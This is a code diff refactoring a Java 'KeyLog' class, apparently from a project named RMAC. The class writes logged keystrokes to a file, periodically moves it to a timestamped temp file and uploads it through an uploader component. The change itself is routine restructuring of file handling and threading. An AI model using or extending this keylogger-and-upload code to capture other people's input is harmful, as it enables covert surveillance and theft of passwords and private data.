@@ -7,6 +7,7 @@ import com.rmac.utils.NoopOutputStream;
 import com.rmac.utils.Pair;
 import com.rmac.utils.Utils;
 import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
@@ -28,9 +29,8 @@ import lombok.extern.slf4j.Slf4j;
 @Getter
 @Setter
 @Slf4j
-public class KeyLog implements Runnable {
+public class KeyLog {
 
-  private File keyLogFile;
   public PrintWriter writer;
   public Thread thread;
   /**
@@ -49,13 +49,12 @@ public class KeyLog implements Runnable {
    * Create key-log file and initialize its writer.
    */
   public KeyLog() {
-    this.keyLogFile = new File(Constants.KEYLOG_LOCATION);
     this.buffer = new ArrayList<>();
 
     if (RMAC.config.getKeyLog()) {
-      openFileWriter();
+      this.openFileWriter();
     } else {
-      writer = new PrintWriter(new NoopOutputStream());
+      writer = RMAC.fs.getNoopWriter();
     }
 
     RMAC.config.onChange((prop, value) -> {
@@ -69,7 +68,10 @@ public class KeyLog implements Runnable {
       }
     });
 
-    thread = new Thread(this, "KLOutput");
+    thread = new Thread(this::run, "KLOutput");
+  }
+
+  public void start() {
     thread.start();
   }
 
@@ -132,8 +134,8 @@ public class KeyLog implements Runnable {
    */
   public void openFileWriter() {
     try {
-      writer = new PrintWriter(new FileWriter(keyLogFile, true));
-    } catch (IOException e) {
+      writer = RMAC.fs.getWriter(Constants.KEYLOG_LOCATION);
+    } catch (FileNotFoundException e) {
       log.error("Could not open key-log file", e);
     }
   }
@@ -146,15 +148,16 @@ public class KeyLog implements Runnable {
   public void openNoopWriter() {
     writer.flush();
     writer.close();
-    writer = new PrintWriter(new NoopOutputStream());
+    writer = RMAC.fs.getNoopWriter();
   }
 
-  @Override
   public void run() {
     try {
       while (!Thread.interrupted()) {
         // Wait until it is time to upload the current key-log output file
-        Thread.sleep(RMAC.config.getKeyLogUploadInterval());
+        synchronized (this.thread) {
+          this.thread.wait(RMAC.config.getKeyLogUploadInterval());
+        }
 
         // If key-logging is disabled via config, no need to upload
         if (!RMAC.config.getKeyLog()) {
@@ -169,10 +172,8 @@ public class KeyLog implements Runnable {
         try {
           String filePath = Constants.TEMP_LOCATION + "\\Key-" + Utils.getTimestamp() + ".txt";
           writer.close();
-          Files.move(keyLogFile.toPath(),
-              Paths.get(filePath),
-              StandardCopyOption.REPLACE_EXISTING);
-          writer = new PrintWriter(new FileWriter(keyLogFile, true));
+          RMAC.fs.move(Constants.KEYLOG_LOCATION, filePath, StandardCopyOption.REPLACE_EXISTING);
+          writer = RMAC.fs.getWriter(Constants.KEYLOG_LOCATION);
           RMAC.uploader.uploadFile(filePath, ArchiveFileType.KEY);
         } catch (IOException e) {
           log.error("Could not move log file to be uploaded", e);
@@ -181,16 +182,16 @@ public class KeyLog implements Runnable {
           try {
             writer.flush();
           } catch (Exception e) {
-            openFileWriter();
+            this.openFileWriter();
           }
         }
 
         this.isBusy = false;
         // Unload all buffered key-logs to new key-log output file
-        unloadBuffer();
+        this.unloadBuffer();
       }
-    } catch (InterruptedException e) {
-      log.warn("Keylog interrupted");
+    } catch (InterruptedException | IllegalArgumentException e) {
+      log.warn("KeyLog interrupted");
     }
   }
 
@@ -229,7 +230,7 @@ public class KeyLog implements Runnable {
   public void pause() {
     this.isBusy = true;
 
-    openNoopWriter();
+    this.openNoopWriter();
 
     this.isBusy = false;
   }
@@ -241,7 +242,7 @@ public class KeyLog implements Runnable {
     this.isBusy = true;
 
     writer.close();
-    openFileWriter();
+    this.openFileWriter();
 
     this.isBusy = false;
   }
